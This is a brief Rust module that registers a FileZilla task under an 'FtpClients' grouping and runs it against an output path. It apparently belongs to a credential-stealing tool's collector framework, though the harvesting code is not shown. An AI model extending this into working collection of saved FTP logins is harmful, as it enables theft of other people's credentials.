#![no_std]
#![allow(unsafe_op_in_unsafe_fn)]

mod filezilla;

extern crate alloc;

use alloc::sync::Arc;
use alloc::vec;
use tasks::{CompositeTask, Task};
use crate::filezilla::FileZillaTask;

pub struct FtpTask {
    inner: CompositeTask
}

impl FtpTask {
    pub fn new() -> Self {
        Self {
            inner: CompositeTask::new(
                vec![
                    Arc::new(FileZillaTask)
                ]
            )
        }
    }
}

impl Task for FtpTask {
    fn parent_name(&self) -> Option<&'static str> {
        Some("FtpClients")
    }

    unsafe fn run(&self, parent: &utils::path::Path) {
        self.inner.run(parent);
    }
}